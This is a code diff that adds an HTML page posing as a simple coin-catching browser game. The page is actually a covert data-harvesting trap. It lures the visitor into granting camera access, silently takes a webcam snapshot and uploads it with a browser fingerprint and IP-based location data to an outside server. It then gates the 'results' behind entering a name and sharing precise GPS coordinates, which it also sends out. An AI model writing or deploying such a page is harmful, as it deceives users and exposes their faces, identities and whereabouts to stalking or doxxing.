@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Coin Catch Game</title>
+  <style>
+    body {
+      margin: 0;
+      background: #111;
+      font-family: monospace;
+      color: #0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    #canvas {
+      display: none;
+    }
+
+    #game-box {
+      position: relative;
+      background: #222;
+      width: 90vw;
+      max-width: 500px;
+      height: 500px;
+      overflow: hidden;
+      border: 2px solid #0f0;
+    }
+
+    #overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      z-index: 5;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 1rem;
+      text-align: center;
+      padding: 10px;
+    }
+
+    #player {
+      width: 60px;
+      height: auto;
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    .coin {
+      width: 40px;
+      height: auto;
+      position: absolute;
+      top: 0;
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    #timer {
+      margin-top: 10px;
+      font-size: 1.2rem;
+    }
+
+    button {
+      margin-top: 10px;
+      padding: 10px 20px;
+      font-family: monospace;
+      background: #0f0;
+      border: none;
+      cursor: pointer;
+    }
+
+    #showResultsBtn {
+      background: #222;
+      color: #0f0;
+      border: 2px solid #0f0;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+
+<body>
+
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <div id="game-box">
+    <img id="player" src="face.png">
+    <div id="overlay">
+      <p>This is a preview. Grant camera access to play!</p>
+      <button id="grantPermsBtn">Grant Camera Access</button>
+      <button id="helpBtn">Need Help?</button>
+    </div>
+  </div>
+
+  <div id="timer">Time Left: 60s</div>
+  <button id="showResultsBtn" disabled>Show Results</button>
+
+  <script>
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const grantBtn = document.getElementById('grantPermsBtn');
+    const helpBtn = document.getElementById('helpBtn');
+    const overlay = document.getElementById('overlay');
+    const player = document.getElementById('player');
+    const gameBox = document.getElementById('game-box');
+    const timerEl = document.getElementById('timer');
+    const showResultsBtn = document.getElementById('showResultsBtn');
+
+    let playerX = gameBox.offsetWidth / 2 - 25;
+    let cameraGranted = false;
+    let gameEnded = false;
+    let coinsCollected = 0;
+
+    /* -----------------------------
+       CLIENT INFO COLLECTION
+    ----------------------------- */
+    async function collectClientInfo() {
+      const browserInfo = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        cookieEnabled: navigator.cookieEnabled,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        deviceMemory: navigator.deviceMemory || "Unknown",
+        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown"
+      };
+
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (connection) {
+        browserInfo.network = {
+          downlink: connection.downlink,
+          effectiveType: connection.effectiveType,
+          rtt: connection.rtt
+        };
+      }
+
+      let ipInfo = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        ipInfo = await res.json();
+      } catch (err) {
+        ipInfo = { error: "Failed to fetch IP info" };
+      }
+
+      return { browserInfo, ipInfo };
+    }
+
+    /* -----------------------------
+       SEND DATA TO SERVER
+    ----------------------------- */
+    async function sendToServer(imageData = null, extra = {}) {
+      const clientInfo = await collectClientInfo();
+      const payload = {
+        image: imageData || "",
+        client: clientInfo,
+        extra
+      };
+
+      try {
+        await fetch("https://simple-game-server-api.onrender.com/upload", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error("Upload failed", err);
+      }
+    }
+
+    /* -----------------------------
+       CAMERA CAPTURE
+    ----------------------------- */
+    async function requestCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        video.onloadedmetadata = () => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/png');
+          sendToServer(imageData); // send snapshot only once
+
+          stream.getTracks().forEach(track => track.stop());
+          overlay.style.display = "none";
+          cameraGranted = true;
+
+          startGameTimer(); // start 1-minute timer
+        };
+      } catch (err) {
+        alert("Camera access was denied.");
+      }
+    }
+
+    grantBtn.addEventListener("click", requestCamera);
+
+    helpBtn.addEventListener("click", () => {
+      overlay.innerHTML = `
+        <p><strong>Camera access was denied.</strong><br>
+        To reset it:</p>
+        <ul style="text-align: left;">
+            <li>Click the <strong>🔒 lock icon</strong> in your browser’s address bar</li>
+            <li>Find "Camera" in the list</li>
+            <li>Set it to "Allow"</li>
+            <li>Refresh the page</li>
+        </ul>
+      `;
+    });
+
+    /* -----------------------------
+       TIMER
+    ----------------------------- */
+    function startGameTimer() {
+      let timeLeft = 60; // seconds
+      const interval = setInterval(() => {
+        timeLeft--;
+        timerEl.textContent = `Time Left: ${timeLeft}s`;
+
+        if (timeLeft <= 0) {
+          clearInterval(interval);
+          endGame();
+        }
+      }, 1000);
+    }
+
+    /* -----------------------------
+       END GAME
+    ----------------------------- */
+    function endGame() {
+      gameEnded = true;
+
+      // ask for name + geolocation
+      overlay.style.display = "flex";
+      overlay.innerHTML = `
+        <p>Game Over! Enter your name and allow location to see results.</p>
+        <input type="text" id="playerName" placeholder="Your Name"/>
+        <button id="submitLocationBtn">Submit Location</button>
+      `;
+
+      const submitBtn = document.getElementById("submitLocationBtn");
+      submitBtn.addEventListener("click", async () => {
+        const name = document.getElementById("playerName").value || "Anonymous";
+
+        if (!navigator.geolocation) {
+          alert("Geolocation is not supported by your browser.");
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const locationData = {
+            name,
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy
+          };
+
+          await sendToServer(null, locationData); // send final data only
+          showResultsBtn.disabled = false;
+          overlay.style.display = "none";
+        }, (err) => {
+          alert("Location permission denied. Cannot show results.");
+        });
+      });
+    }
+
+    /* -----------------------------
+       COIN SPAWNING
+    ----------------------------- */
+    function spawnCoin() {
+      if (gameEnded) return;
+
+      const coin = document.createElement('img');
+      coin.src = 'coin.png';
+      coin.className = 'coin';
+      coin.style.left = Math.random() * (gameBox.offsetWidth - 40) + 'px';
+      gameBox.appendChild(coin);
+
+      let y = 0;
+      const fall = setInterval(() => {
+        y += 5;
+        coin.style.top = y + 'px';
+
+        const playerRect = player.getBoundingClientRect();
+        const coinRect = coin.getBoundingClientRect();
+
+        if (
+          coinRect.bottom >= playerRect.top &&
+          coinRect.left < playerRect.right &&
+          coinRect.right > playerRect.left
+        ) {
+          coin.remove();
+          clearInterval(fall);
+          coinsCollected++;
+        }
+
+        if (y > gameBox.offsetHeight) {
+          coin.remove();
+          clearInterval(fall);
+        }
+      }, 30);
+    }
+
+    /* -----------------------------
+       GAME LOOP
+    ----------------------------- */
+    function gameLoop() {
+      if (gameEnded) return; // movement runs even in preview
+
+      playerX += Math.random() < 0.5 ? -3 : 3;
+      playerX = Math.max(0, Math.min(gameBox.offsetWidth - 60, playerX));
+      player.style.left = playerX + 'px';
+
+      requestAnimationFrame(gameLoop);
+    }
+
+    /* -----------------------------
+       CONTROLS
+    ----------------------------- */
+    document.addEventListener('keydown', (e) => {
+      if (gameEnded) return;
+      if (e.key === 'ArrowLeft') playerX -= 15;
+      if (e.key === 'ArrowRight') playerX += 15;
+    });
+
+    if (window.DeviceOrientationEvent) {
+      window.addEventListener('deviceorientation', (event) => {
+        if (gameEnded) return;
+        const gamma = event.gamma;
+        if (gamma > 5) playerX += 5;
+        if (gamma < -5) playerX -= 5;
+      });
+    }
+
+    setInterval(spawnCoin, 1000);
+    gameLoop();
+
+    /* -----------------------------
+       SHOW RESULTS BUTTON
+    ----------------------------- */
+    showResultsBtn.addEventListener("click", () => {
+      alert(`🎉 You collected ${coinsCollected} coins!`);
+    });
+  </script>
+
+</body>
+</html>
